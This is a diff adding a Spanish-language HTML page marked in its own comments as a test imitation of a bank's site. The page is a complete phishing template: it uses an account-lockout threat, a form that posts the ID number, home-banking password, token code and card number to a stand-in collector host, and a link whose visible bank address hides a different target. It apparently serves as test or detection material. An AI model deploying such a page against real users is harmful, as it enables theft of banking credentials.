@@ -1,0 +1,26 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta property="og:site_name" content="Banco de Demostración">
+  <title>Banco de Demostración - Validá tu cuenta</title>
+</head>
+<body>
+  <!-- Imitación de prueba: copia la marca del banco oficial en otra dirección. -->
+  <header>
+    <img class="logo" alt="Banco de Demostración logo" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">
+  </header>
+  <main>
+    <h1>Validá tu cuenta (página de prueba)</h1>
+    <p><strong>Tu cuenta será bloqueada en 24 horas</strong> si no confirmás tus datos.</p>
+    <form aria-label="Validar cuenta" method="post" action="https://recolector.example/guardar">
+      <p><label for="dni">Número de documento</label> <input id="dni" inputmode="numeric"></p>
+      <p><label for="clave">Clave de home banking</label> <input id="clave" type="password" autocomplete="current-password"></p>
+      <p><label for="token">Código del token</label> <input id="token" autocomplete="one-time-code"></p>
+      <p><label for="tarjeta">Número de tarjeta</label> <input id="tarjeta" autocomplete="cc-number"></p>
+      <p><button type="submit">Validar ahora</button></p>
+    </form>
+    <p><a href="https://recolector.example/ayuda">www.banco-demo.example/ayuda</a></p>
+  </main>
+</body>
+</html>
